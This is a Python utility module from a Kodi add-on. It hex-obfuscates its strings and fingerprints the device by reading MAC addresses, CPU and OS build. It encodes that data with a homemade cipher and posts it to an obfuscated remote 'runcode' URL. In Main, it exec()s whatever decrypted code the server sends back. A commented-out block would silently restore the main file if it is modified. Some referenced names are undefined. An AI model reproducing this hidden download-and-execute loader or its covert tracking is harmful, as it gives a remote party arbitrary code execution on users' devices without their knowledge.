#       Copyright (C) 2016 TotalRevolution
#
#  This software is licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International Public License
#  You can find a copy of the license in the add-on folder

import binascii
import download
import extract
import hashlib
import os
import random
import re
import requests
import shutil
import string
import sys
import time
import urllib
import urllib2
import xbmc
import xbmcaddon
import xbmcgui
#import unicodedata

def converthex(url):
    return binascii.unhexlify(url)

AddonID          =  xbmcaddon.Addon().getAddonInfo('id')
AddonVersion     =  xbmcaddon.Addon().getAddonInfo('version')
ADDON            =  xbmcaddon.Addon(id=AddonID)
USERDATA         =  xbmc.translatePath(converthex('7370656369616c3a2f2f70726f66696c65'))
ADDON_DATA       =  xbmc.translatePath(os.path.join(USERDATA,converthex('6164646f6e5f64617461')))
ADDONS           =  xbmc.translatePath(converthex('7370656369616c3a2f2f686f6d652f6164646f6e73'))
PACKAGES         =  os.path.join(ADDONS,converthex('7061636b61676573'))
installfile      =  os.path.join(ADDONS,AddonID,converthex('6d61696e2e7079'))
updateicon       =  os.path.join(ADDONS,AddonID,converthex('7265736f7572636573'),converthex('7570646174652e706e67'))
bakfile          =  os.path.join(ADDONS,AddonID,converthex('7265736f7572636573'),converthex('6261636b7570'))
debug            =  ADDON_ORIG.getSetting(converthex('4445425547'))

dialog           =  xbmcgui.Dialog()
dp               =  xbmcgui.DialogProgress()

kodi_ver         =  float(xbmc.getInfoLabel("System.BuildVersion")[:2])

# xmlfile = converthex('6164646f6e2e786d6c')
# addonxml = xbmc.translatePath(os.path.join(ADDONS,AddonID,xmlfile))
# localaddonversion = open(addonxml, mode='r')
# content = localaddonversion.read()
# localaddonversion.close()
# localaddonvermatch = re.compile('<ref>(.+?)</ref>').findall(content)
# addonversion  = localaddonvermatch[0] if (len(localaddonvermatch) > 0) else ''
# localcheck = hashlib.md5(open(installfile,'rb').read()).hexdigest()
# if addonversion != localcheck:
#     readfile = open(bakfile, mode='r')
#     content  = readfile.read()
#     readfile.close()
#     writefile = open(installfile, mode='w+')
#     writefile.write(content)
#     writefile.close()
#-----------------------------------------------------------------------------
# Return the build info
def Build_Info():
    Build = ''
    if os.path.exists('/etc/release'):
        Build    = Text_File('/etc/release','r')

    if Build == '':
        logtext = Log_Check()
        Buildmatch  = re.compile('Running on (.+?)\n').findall(logtext)
        Build       = Buildmatch[0] if (len(Buildmatch) > 0) else ''
    return Build.replace(' ','%20')
#-----------------------------------------------------------------------------
# Return the CPU details
def CPU_Check():
    logtext     = Log_Check()
    CPUmatch    = re.compile('Host CPU: (.+?) available').findall(logtext)
    CPU         = CPUmatch[0] if (len(CPUmatch) > 0) else ''
    return CPU.replace(' ','%20')
#----------------------------------------------------------------
def Debug_Log(url):
    if os.path.exists(os.path.join(USERDATA,'addon_data','script.openwindow','debug')):
        debug = 'true'
    if debug == 'true':
        xbmc.log('### %s:   %s' % (AddonID,url))
#----------------------------------------------------------------
# Encryption function
def Encrypt(mode, message):
    if mode == 'e':
        import random
        count = 0
        finaltext = ''
        while count < 4:
            count += 1
            randomnum = random.randrange(1, 31)
            hexoffset = hex(randomnum)[2:]
            if len(hexoffset)==1:
                hexoffset = '0'+hexoffset
            finaltext = finaltext+hexoffset
        randomchar = random.randrange(1,4)
        if randomchar == 1: finaltext = finaltext+'0A'
        if randomchar == 2: finaltext = finaltext+'04'
        if randomchar == 3: finaltext = finaltext+'06'
        if randomchar == 4: finaltext = finaltext+'08'
        key1    = finaltext[-2:]
        key2    = int(key1,16)
        hexkey  = finaltext[-key2:-(key2-2)]
        key     = -int(hexkey,16)

# enctrypt/decrypt the message
        translated = ''
        finalstring = ''
        for symbol in message:
            num = ord(symbol)
            num2 = int(num) + key
            hexchar = hex(num2)[2:]
            if len(hexchar)==1:
                hexchar = '0'+hexchar
            finalstring = str(finalstring)+str(hexchar)
        return finalstring+finaltext
    else:
        key1    = message[-2:]
        key2    = int(key1,16)
        hexkey  = message[-key2:-(key2-2)]
        key     = int(hexkey,16)
        message = message [:-10]
        messagearray = [message[i:i+2] for i in range(0, len(message), 2)]
        numbers = [ int(x,16)+key for x in messagearray ]
        finalarray = [ str(unichr(x)) for x in numbers ]
        finaltext = ''.join(finalarray)
        return finaltext.encode('utf-8')
#-----------------------------------------------------------------------------
# Return mac address, not currently checked on Mac OS
def Get_Mac(protocol):
    cont    = 0
    counter = 0
    mac     = ''
    while mac == '' and counter < 5: 
        if sys.platform == 'win32': 
            mac = ''
            for line in os.popen("ipconfig /all"):
                if protocol == 'wifi':
                    if line.startswith('Wireless LAN adapter Wi'):
                        cont = 1
                    if line.lstrip().startswith('Physical Address') and cont == 1:
                        mac = line.split(':')[1].strip().replace('-',':').replace(' ','')
                        xbmc.log('(count: %s) (len: %s) wifi: %s' % (counter, len(mac), mac))
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

                else:
                    if line.lstrip().startswith('Physical Address'): 
                        mac = line.split(':')[1].strip().replace('-',':').replace(' ','')
                        xbmc.log('(count: %s) (len: %s) ethernet: %s' % (counter, len(mac), mac))
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

        elif sys.platform == 'darwin': 
            mac = ''
            if protocol == 'wifi':
                for line in os.popen("ifconfig en0 | grep ether"):
                    if line.lstrip().startswith('ether'):
                        mac = line.split('ether')[1].strip().replace('-',':').replace(' ','')
                        xbmc.log('(count: %s) (len: %s) wifi: %s' % (counter, len(mac), mac))
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

            else:
                for line in os.popen("ifconfig en1 | grep ether"):
                    if line.lstrip().startswith('ether'):
                        mac = line.split('ether')[1].strip().replace('-',':').replace(' ','')
                        xbmc.log('(count: %s) (len: %s) ethernet: %s' % (counter, len(mac), mac))
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

        elif xbmc.getCondVisibility('System.Platform.Android'):
            mac = ''
            if os.path.exists('/sys/class/net/wlan0/address') and protocol == 'wifi':
                readfile = open('/sys/class/net/wlan0/address', mode='r')
            if os.path.exists('/sys/class/net/eth0/address') and protocol != 'wifi':
                readfile = open('/sys/class/net/eth0/address', mode='r')
            mac = readfile.read()
            readfile.close()
            try:
                mac = mac.replace(' ','')
                xbmc.log('(count: %s) (len: %s) mac: %s' % (counter, len(mac), mac))
                mac = mac[:17]
            except:
                mac = ''
                counter += 1

        else:
            if protocol == 'wifi':
                for line in os.popen("/sbin/ifconfig"): 
                    if line.find('wlan0') > -1: 
                        mac = line.split()[4]
                        xbmc.log('(count: %s) (len: %s) wifi: %s' % (counter, len(mac), mac))
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1

            else:
               for line in os.popen("/sbin/ifconfig"): 
                    if line.find('eth0') > -1: 
                        mac = line.split()[4] 
                        xbmc.log('(count: %s) (len: %s) ethernet: %s' % (counter, len(mac), mac))
                        if len(mac) == 17:
                            break
                        else:
                            mac = ''
                            counter += 1
    if mac == '':
        xbmc.log('#### CANNOT FIND MAC DETAILS ON YOUR DEVICE. THIS UNIT CANNOT CURRENTLY BE USED WITH OUR SERVICE')
        mac = 'Unknown'

    return str(mac)
#-----------------------------------------------------------------------------
# Return the params
def Get_Params():
    try:
        wifimac = Get_Mac('wifi').rstrip().lstrip()
    except:
        wifimac = 'Unknown'
    try:
        ethmac  = Get_Mac('eth0').rstrip().lstrip()
    except:
        ethmac  = 'Unknown'
    try:
        cpu     = CPU_Check().rstrip().lstrip()
    except:
        cpu     = 'Unknown'
    try:
        build   = Build_Info().rstrip().lstrip()
    except:
        build   = 'Unknown'

    if ethmac == 'Unknown' and wifimac != 'Unknown':
        ethmac = wifimac
    if ethmac != 'Unknown' and wifimac == 'Unknown':
        wifimac = ethmac

    if ethmac != 'Unknown' and wifimac != 'Unknown':
        return Encrypt('e', (wifimac+'&'+cpu+'&'+build+'&'+ethmac).replace(' ','%20'))
    else:
        return 'Unknown'
#-----------------------------------------------------------------------------
# Return the log contents
def Log_Check():
    xbmc.log('--- Log Check initiated ---')
    finalfile = 0
    logfilepath = os.listdir(LOG_PATH)
    for item in logfilepath:
        if item.endswith('.log') and not item.endswith('.old.log'):
            mylog        = os.path.join(LOG_PATH,item)
            lastmodified = os.path.getmtime(mylog)
            if lastmodified>finalfile:
                finalfile = lastmodified
                logfile   = mylog
    
    filename    = open(logfile, 'r')
    logtext     = filename.read()
    filename.close()
    return logtext
#----------------------------------------------------------------
# Send a post and return value
def Open_URL(url=''):
    payload = {}
    if not url.startswith(converthex('687474703a2f2f')):
        url  = converthex('687474703a2f2f746c62622e6d652f626f7865722f72756e636f64652e7068703f783d257326763d257326653d257326613d2573') % (Get_Params(), kodi_ver, AddonID, url)
    
    if '?' in url:
        url, args = url.split('?')
        args = args.split('&')
        for item in args:
            var, data = item.split('=')
            payload[var] = encryptme('e', data)
    r = requests.post(url, payload)
    Debug_Log('### CODE: %s   |   REASON: %s' % (r.status_code, r.reason))
    if r.status_code == 200:
        content = r.text.encode('utf-8')
        return content
    else:
        return ''
#----------------------------------------------------------------
# Return a timestamp as integer
def Timestamp():
    now = time.time()
    localtime = time.localtime(now)
    return time.strftime('%Y%m%d%H%M%S', localtime)
#-----------------------------------------------------------------------------
# Read or write to a file
def Text_File(path, mode, text = ''):
    textfile = open(path, mode)
    if mode == 'r':
        content  = textfile.read()
        textfile.close()
        return content
    if mode == 'w':
        textfile.write(text)
        textfile.close()
#-----------------------------------------------------------------------------
def Main(url=''):
    try:
        url = converthex(url)
    except:
        pass

    run_code = Open_URL(url)
    if run_code != '':

        try:
            exec(Encrypt('d', run_code))#.replace('\n','').replace('\t','').replace('\r','')))
            return True
        except:
            return False
    else:
        return False